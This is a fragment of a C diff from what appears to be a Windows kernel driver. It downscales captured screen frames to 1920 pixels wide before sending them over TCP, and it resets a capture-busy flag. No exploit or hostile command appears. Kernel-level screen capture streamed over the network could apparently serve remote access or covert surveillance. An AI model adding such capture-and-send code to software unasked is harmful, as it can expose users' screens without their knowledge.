+            }
+        }
+
+        /*
+         * Downscale to max width. TCP can handle larger frames reliably;
+         * 1920px keeps 1080p desktops native while still limiting 4K
+         * keyframes to roughly 8 MB.
+         */
+#define SS_MAX_SEND_WIDTH  1920
+        if (w > SS_MAX_SEND_WIDTH) {
+            ULONG newW = SS_MAX_SEND_WIDTH;
+            ULONG newH = (ULONG)((ULONG64)h * newW / w);
+            if (newH == 0) newH = 1;
+            ULONG newSize = newW * newH * 4;
+            PUCHAR dst = (PUCHAR)ExAllocatePool2(POOL_FLAG_PAGED, newSize, TAG_SS);
+            if (dst) {
+                const ULONG* src32 = (const ULONG*)g_PixelBuf;
+                ULONG* dst32 = (ULONG*)dst;
+                ULONG y, x;
+                for (y = 0; y < newH; y++) {
+                    ULONG srcY = (ULONG)((ULONG64)y * h / newH);
+                    const ULONG* srcRow = src32 + srcY * w;
+                    for (x = 0; x < newW; x++) {
+                        ULONG srcX = (ULONG)((ULONG64)x * w / newW);
+                        dst32[y * newW + x] = srcRow[srcX];
+                    }
+                }
+                /* Swap buffer */
+                if (g_PixelBufSize < newSize) {
+                    ExFreePoolWithTag(g_PixelBuf, TAG_SS);
+                    g_PixelBuf = dst;
+                    g_PixelBufSize = newSize;
+                } else {
+                    RtlCopyMemory(g_PixelBuf, dst, newSize);
+                    ExFreePoolWithTag(dst, TAG_SS);
+                }
+                w = newW;
+                h = newH;
+                frameSize = newSize;
+            }
+        }
+#undef SS_MAX_SEND_WIDTH
 
         st = SendFrame(w, h, (PUCHAR)g_PixelBuf, frameSize);
     }
 
     g_FrameCount++;
+    InterlockedExchange(&g_ShotBusy, 0);
     return st;
 }
